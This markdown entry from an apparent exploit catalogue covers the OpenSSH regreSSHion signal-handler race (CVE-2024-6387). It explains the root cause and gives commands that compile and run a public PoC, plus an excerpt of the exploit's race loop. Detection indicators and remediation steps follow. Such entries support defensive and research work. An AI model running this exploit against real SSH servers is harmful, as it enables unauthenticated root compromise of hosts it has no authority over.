# OpenSSH regreSSHion Signal-Handler Race Unauthenticated RCE (CVE-2024-6387)

<!-- 
  File: 2026-05-16_openssh-regresshion-signal-handler-race.md
  Location: pocs/network/
-->

---

## Metadata

| Field | Value |
|---|---|
| **Date Added** | 2026-05-16 |
| **Author / Researcher** | Qualys Threat Research Unit (disclosure); 7etsuo (public PoC implementation) |
| **CVE / Advisory** | CVE-2024-6387 |
| **Category** | network |
| **Severity** | High |
| **CVSS Score** | 8.1 (CVSSv3) |
| **Status** | Weaponized |
| **Tags** | RCE, OpenSSH, sshd, glibc, race-condition, SIGALRM, unauthenticated |
| **Related** | N/A |

---

## Affected Target

| Field | Value |
|---|---|
| **Software / System** | OpenSSH server daemon (`sshd`) on glibc-based Linux |
| **Versions Affected** | OpenSSH 8.5p1 through 9.7p1 on glibc-based Linux distributions (fixed in 9.8p1) |
| **Language / Platform** | C / Linux (glibc) |
| **Authentication Required** | No |
| **Network Access Required** | Yes |

---

## Summary

CVE-2024-6387 (regreSSHion) is a signal-handler race condition in OpenSSH `sshd` that reintroduced a previously fixed bug class and can allow unauthenticated remote code execution as root on glibc-based Linux systems. The issue is triggered around `LoginGraceTime` signal handling where async-signal-unsafe behavior is reachable during authentication timeout processing. Public PoC code was released shortly after disclosure, and broad internet scanning/exploitation activity has been reported, including inclusion in CISA KEV.

---

## Vulnerability Details

### Root Cause

A regression in `sshd` removed hardening that previously prevented unsafe operations in the `SIGALRM` timeout path. When `sshd` invokes async-signal-unsafe functions from the signal handler, attacker-influenced heap state and timing can be abused to win a race condition.

### Attack Vector

An unauthenticated remote attacker repeatedly opens SSH sessions, manipulates packet timing and memory layout, and attempts to deliver a final packet byte near `LoginGraceTime` expiration so vulnerable signal-handler execution occurs in an exploitable state.

### Impact

- Unauthenticated remote code execution as root on vulnerable hosts.
- High operational risk for internet-exposed SSH services.
- Potential full host compromise and lateral movement from a single exposed service.

---

## Environment / Lab Setup

```
OS:          glibc-based Linux distribution with vulnerable OpenSSH server
Target:      OpenSSH sshd 8.5p1–9.7p1 reachable over TCP/22 in an isolated lab
Attacker:    Authorized test host with network path to target SSH service
Tools:       gcc, nc/tcp utilities, packet capture, repeated timing attempts
```

### Setup Steps

```bash
# Authorized lab only
cd pocs/network/2026-05-16_openssh-regresshion-signal-handler-race
gcc -O2 -o regresshion 7etsuo-regreSSHion.c
./regresshion <target_ip> 22
```

---

## Proof of Concept

### Step-by-Step Reproduction

1. Build an isolated authorized lab with a vulnerable glibc-based OpenSSH server.
2. Compile the PoC C source in this entry.
3. Run repeated exploit attempts against the target SSH service.
4. Correlate timing attempts, SSH service behavior, and host telemetry for signs of race-condition hits.

### Exploit Code

> See `7etsuo-regreSSHion.c` in this folder.

```c
// excerpt
for (int attempt = 0; attempt < 20000 && !success; attempt++) {
    int sock = setup_connection(ip, port);
    if (perform_ssh_handshake(sock) < 0) {
        close(sock);
        continue;
    }
    prepare_heap(sock);
    time_final_packet(sock, &parsing_time);
    if (attempt_race_condition(sock, parsing_time, glibc_base)) {
        success = 1;
    }
}
```

### Expected Output

```
Attempting exploitation with glibc base: 0x...
Attempt 1000 of 20000
Estimated parsing time: ... seconds
Possible hit on 'large' race window
```

---

## Screenshots / Evidence

- `screenshots/` — add authorized lab captures of exploit attempts, SSH daemon behavior, and forensic evidence.

---

## Detection & Indicators of Compromise

```
- High-volume repeated unauthenticated SSH connection attempts tuned around LoginGraceTime windows
- sshd crashes/restarts or anomalous authentication timeout patterns
- Unusual process behavior spawned from sshd context on vulnerable hosts
```

**SIEM / IDS Rule (example):**
```
Alert on excessive failed/unauthenticated SSH handshakes from a single source,
especially with sustained burst timing near authentication timeout windows.
```

---

## Remediation

| Action | Detail |
|---|---|
| **Patch** | Upgrade OpenSSH to 9.8p1 or vendor-fixed packages addressing CVE-2024-6387 |
| **Workaround** | Reduce exposure by restricting SSH access (VPN/jump hosts/allowlists) and limiting unauthenticated connection rates |
| **Config Hardening** | Minimize attack surface on internet-facing SSH, monitor auth timeout anomalies, and apply compensating controls until patching is complete |

---

## References

- [CVE-2024-6387 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-6387)
- [Qualys TRU regreSSHion advisory](https://www.qualys.com/2024/07/01/cve-2024-6387/regresshion.txt)
- [CISA Known Exploited Vulnerabilities Catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)
- [OpenSSH 9.8 release announcement](https://www.openssh.com/txt/release-9.8)
- [Source Repository — 7etsuo/cve-2024-6387-poc](https://github.com/7etsuo/cve-2024-6387-poc)

---

## Notes

Auto-ingested from https://github.com/7etsuo/cve-2024-6387-poc on 2026-05-16.
